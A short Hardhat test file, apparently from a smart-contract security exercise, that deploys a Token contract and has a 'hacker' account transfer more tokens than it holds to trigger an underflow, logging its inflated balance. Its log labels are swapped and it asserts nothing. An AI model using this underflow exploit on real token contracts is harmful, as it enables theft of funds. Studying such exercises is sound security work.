const { expect } = require("chai");
const { ethers } = require("hardhat");

let chai = require('chai');
const { default: BigNumber } = require("bignumber.js");
let should = require('chai').should();

chai.use(require('chai-bignumber')());

describe("Token", function () {
  it("Hacker should have more tokens after transfer", async function () {

    const [deployer, hacker, receiver] = await ethers.getSigners();

    const Token = await ethers.getContractFactory("Token", deployer);
    const token = await Token.deploy(ethers.utils.parseUnits('100000'));
    await token.deployed();
    console.log('after transfer');
    await token.transfer(hacker.address, ethers.utils.parseUnits('20'));
    console.log('before transfer');

    // expect(await token.balanceOf(hacker.address)).to.equal(ethers.utils.)
    let balance = ethers.utils.formatEther(await token.balanceOf(hacker.address))
    console.log(`Hacker balance before hack: ${balance} Tokens`);

    await token.connect(hacker).transfer(receiver.address, ethers.utils.parseUnits('21'));

    balance = ethers.utils.formatEther(await token.balanceOf(hacker.address))
    console.log(`Hacker balance after hack: ${balance} Tokens`);

  });
});
